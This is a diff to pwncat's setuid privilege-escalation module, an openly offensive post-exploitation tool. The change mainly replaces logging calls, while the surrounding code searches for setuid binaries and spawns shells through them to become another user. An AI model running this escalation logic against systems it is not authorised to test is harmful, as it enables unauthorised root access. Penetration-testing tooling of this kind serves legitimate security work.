@@ -8,10 +8,10 @@ from colorama import Fore, Style
 
 import io
 
-from pwncat.util import info, success, error, progress, warn
 from pwncat.privesc.base import Method, PrivescError, Technique, Capability
 from pwncat import gtfobins
 from pwncat.file import RemoteBinaryPipe
+from pwncat import util
 
 
 class SetuidMethod(Method):
@@ -42,7 +42,7 @@ class SetuidMethod(Method):
 
         while True:
             path = self.pty.recvuntil(b"\n").strip()
-            progress("searching for setuid binaries")
+            util.progress("searching for setuid binaries")
 
             if delim in path:
                 break
@@ -87,10 +87,6 @@ class SetuidMethod(Method):
         binary = technique.ident
         enter, input, exit = binary.shell(self.pty.shell, suid=True)
 
-        info(
-            f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
-        )
-
         before_shell_level = self.pty.run("echo $SHLVL").strip()
         before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0
 
@@ -107,16 +103,13 @@ class SetuidMethod(Method):
         # sleep(0.1)
         user = self.pty.run("whoami").strip().decode("utf-8")
         if user == technique.user:
-            success("privesc succeeded")
             return exit
         else:
-            error(f"privesc failed (still {user} looking for {technique.user})")
             after_shell_level = self.pty.run("echo $SHLVL").strip()
             after_shell_level = (
                 int(after_shell_level) if after_shell_level != b"" else 0
             )
             if after_shell_level > before_shell_level:
-                info("exiting spawned inner shell")
                 self.pty.run(exit, wait=False)  # here be dragons
 
         raise PrivescError(f"escalation failed for {technique}")
